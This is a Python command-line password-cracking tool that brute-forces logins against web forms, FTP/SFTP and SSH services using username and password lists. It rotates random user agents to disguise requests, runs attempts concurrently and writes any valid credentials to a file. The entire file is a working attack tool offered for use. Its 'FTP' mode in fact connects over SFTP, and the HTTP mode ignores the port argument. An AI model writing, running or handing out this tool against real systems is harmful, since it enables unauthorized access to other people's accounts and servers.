import argparse
import requests
from fake_useragent import UserAgent
import threading
import time
import logging
import paramiko
import pysftp
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

print('''
   _____ _            _ _____                                    _  _____                _             
  / ____| |          | |  __ \                                  | |/ ____|              | |            
 | (___ | |_ ___  ___| | |__) |_ _ ___ _____      _____  _ __ __| | |     _ __ __ _  ___| | _____ _ __ 
  \___ \| __/ _ \/ _ \ |  ___/ _` / __/ __\ \ /\ / / _ \| '__/ _` | |    | '__/ _` |/ __| |/ / _ \ '__|
  ____) | ||  __/  __/ | |  | (_| \__ \__ \\ V  V / (_) | | | (_| | |____| | | (_| | (__|   <  __/ |   
 |_____/ \__\___|\___|_|_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|\_____|_|  \__,_|\___|_|\_\___|_|   
                                                                                                       
                                                                                                        ''')
init()

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def http_brute_force(url, usernames, passwords, request_delay, verbose, max_workers, timeout, save_file, port):
    ua = UserAgent()

    def try_login(username, password):
        user_agent = ua.random
        headers = {"User-Agent": user_agent}
        data = {"username": username, "password": password}  # Modify these keys according to your form fields
        try:
            response = requests.post(url, data=data, headers=headers, timeout=timeout)
            if "success_message" in response.text:  # Modify this condition based on successful login response
                success_message = f"Found valid credentials: {username}:{password}"
                logging.info(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
                if save_file:
                    with open(save_file, 'a') as f:
                        f.write(success_message + "\n")
                return True
            else:
                if verbose:
                    logging.info(f"{Fore.RED}Invalid credentials: {username}:{password}{Style.RESET_ALL}")
                return False
        except requests.RequestException as e:
            if verbose:
                logging.info(f"{Fore.RED}Request error: {e}{Style.RESET_ALL}")
            return False

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(try_login, username, password))
                time.sleep(request_delay)
        
        for future in as_completed(futures):
            if future.result():
                executor.shutdown(wait=False)
                break

def ftp_brute_force(host, usernames, passwords, port, request_delay, verbose, save_file):
    def try_login(username, password):
        try:
            with pysftp.Connection(host, username=username, password=password, port=port) as sftp:
                success_message = f"Found valid credentials: {username}:{password}"
                logging.info(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
                if save_file:
                    with open(save_file, 'a') as f:
                        f.write(success_message + "\n")
                return True
        except Exception as e:
            if verbose:
                logging.info(f"{Fore.RED}Invalid credentials: {username}:{password} - {e}{Style.RESET_ALL}")
            return False

    for username in usernames:
        for password in passwords:
            if try_login(username, password):
                return
            time.sleep(request_delay)

def ssh_brute_force(host, usernames, passwords, port, request_delay, verbose, save_file):
    def try_login(username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password, timeout=5)
            success_message = f"Found valid credentials: {username}:{password}"
            logging.info(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
            if save_file:
                with open(save_file, 'a') as f:
                    f.write(success_message + "\n")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            if verbose:
                logging.info(f"{Fore.RED}Invalid credentials: {username}:{password}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"{Fore.RED}Connection error: {e}{Style.RESET_ALL}")
            return False

    for username in usernames:
        for password in passwords:
            if try_login(username, password):
                return
            time.sleep(request_delay)

def main():
    parser = argparse.ArgumentParser(description='Brute force tool for HTTP, FTP, and SSH')
    
    parser.add_argument('--http', action='store_true', help='Use HTTP brute force for web login forms')
    parser.add_argument('--ftp', action='store_true', help='Use FTP brute force for FTP login')
    parser.add_argument('--ssh', action='store_true', help='Use SSH brute force for SSH login')
    
    parser.add_argument('-u', '--username', help='Single username for brute forcing (e.g. admin)')
    parser.add_argument('-U', '--username-file', help='Path to the username file (e.g. usernames.txt)')
    parser.add_argument('-p', '--password', help='Single password for brute forcing (e.g. password123)')
    parser.add_argument('-P', '--password-file', help='Path to the password file (e.g. passwords.txt)')
    
    parser.add_argument('-H', '--host', required=True, help='Target host (IP or domain) for brute force attack')
    parser.add_argument('-d', '--delay', type=int, default=5, help='Delay in seconds between each login attempt (default: 5)')
    parser.add_argument('--port', type=int, help='Port number for the target service (default: 80 for HTTP, 21 for FTP, 22 for SSH)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode for more detailed logging')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Timeout in seconds for each login attempt (default: 5)')
    parser.add_argument('-s', '--save', help='File to save valid credentials (e.g. valid_credentials.txt)')

    args = parser.parse_args()

    usernames = []
    passwords = []

    if args.username:
        usernames.append(args.username)
    if args.username_file:
        with open(args.username_file, 'r') as f:
            usernames.extend(f.read().splitlines())

    if args.password:
        passwords.append(args.password)
    if args.password_file:
        with open(args.password_file, 'r') as f:
            passwords.extend(f.read().splitlines())

    if not usernames or not passwords:
        parser.error("At least one username and one password must be provided.")

    port = args.port  # Use the provided port number

    if args.http:
        http_brute_force(args.host, usernames, passwords, args.delay, args.verbose, args.workers, args.timeout, args.save, port or 80)
    elif args.ftp:
        ftp_brute_force(args.host, usernames, passwords, port or 21, args.delay, args.verbose, args.save)
    elif args.ssh:
        ssh_brute_force(args.host, usernames, passwords, port or 22, args.delay, args.verbose, args.save)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
